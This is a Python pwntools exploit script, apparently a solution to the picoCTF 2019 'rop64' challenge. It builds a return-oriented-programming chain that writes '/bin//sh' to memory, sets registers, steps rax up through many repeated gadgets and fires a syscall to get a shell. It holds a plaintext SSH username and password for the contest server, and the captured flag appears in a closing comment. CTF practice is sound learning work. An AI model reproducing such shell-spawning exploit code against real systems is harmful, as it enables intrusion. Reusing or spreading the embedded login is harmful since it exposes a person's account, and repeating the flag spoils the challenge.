import sys
from pwn import *
from struct import pack

if len(sys.argv) < 2:
	r = process('./rop64')
else:
	s = ssh(host = '2019shell1.picoctf.com', user = "Linh169", password = "mylinh1006")
	r = s.process('./vuln', cwd = "/problems/rop64_2_28215c88506d7e5e93b4bdabe21a4d5b")

raw_input('debug')

# Padding goes here
p = 'a'*0x18
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004156f4) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b6ff) # syscall

r.sendlineafter("out of this?", p)
r.interactive()
r.close()
# picoCTF{rOp_t0_b1n_sH_w1tH_n3w_g4dg3t5_11cdd436}